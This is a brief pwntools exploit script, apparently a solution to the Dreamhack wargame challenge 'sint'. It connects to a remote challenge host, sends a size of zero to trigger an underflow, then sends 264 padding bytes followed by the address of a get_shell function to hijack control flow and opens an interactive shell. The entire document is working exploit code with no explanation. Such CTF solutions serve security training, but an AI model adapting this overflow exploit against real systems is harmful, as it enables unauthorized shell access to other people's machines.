from pwn import *

p = remote("host1.dreamhack.games", 16444)
elf = ELF("./sint")

get_shell = elf.symbols['get_shell']

payload_1 = "0"

payload_2 = "\x90"*264
payload_2 += p32(get_shell)

p.recvuntil("Size: ")
p.sendline(payload_1)

p.recvuntil("Data: ")
p.send(payload_2)

p.interactive()
